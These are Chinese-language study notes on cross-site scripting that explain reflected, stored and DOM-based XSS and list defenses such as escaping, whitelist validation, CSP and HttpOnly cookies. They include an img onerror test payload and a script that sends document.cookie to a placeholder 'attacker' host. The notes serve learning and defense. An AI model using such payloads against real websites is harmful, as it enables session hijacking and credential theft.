# 跨站脚本攻击，将<script>标签作为内容进行get（url）、post（上传）。https://blog.csdn.net/yifeng_peng/article/details/86264499  此文很好地概述了！注意XSS恶意代码一般在被攻击网站上。
反射型XSS：恶意url含有<script>等内容，服务器在页面中插入了恶意内容并作为响应发送给客户端，客户端在页面加载时执行恶意内容。在网站输入脚本能被浏览器执行，那么可以做成url且网站存在XSS漏洞。
存储型XSS：post将<script>内容存储到服务器，例如留言、bbs、图片都是可以存储的，此时再访问页面便会执行脚本。
DOM型XSS：DOM型XSS是基于DOM文档对象模型的一种漏洞。恶意url含有<script>等内容，但是服务器并不会在响应的页面中插入恶意内容，例如客户端可以从URL中获取数据，但是客户端仍然将恶意内容作为脚本执行。
防御：对用户输入做编码/转义处理，是第一道防线；安全输入检查(验证/过滤，白名单更为有效)，出站的输入处理应该是对抗XSS的基本方法，并且客户端也应该进行安全输入检查，是第二道防线；客户端的内容安全策略（CSP）是第三道防线，页面提供额外的HTTP头：Content-Security-Policy有效防御DOM型。httponly防止cookie被带出
https://www.jianshu.com/p/4fcb4b411a66
http://192.168.1.102/xss/example4.php?name=<img src='w.123' onerror='alert("hey!")'>
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>
如果一个攻击者可以利用你的网站在其他人的浏览器上执行任意 JavaScript 代码，你的网站和用户的安全都是存在问题的。
JavaScript 代码访问了一些用户敏感信息，例如：document.cookie 
JavaScript 代码可以使用 XMLHttpRequest和其他机制来发送包含任何内容的 HTTP 请求到任意目的地。
JavaScript 代码可以通过使用 DOM 操作来对当前页面的 HTML 文件做任意修改。攻击者可以使用 DOM 操作在页面中插入假的登录表单，设置表单的 action 到自己的服务器，之后欺骗用户提交敏感信息。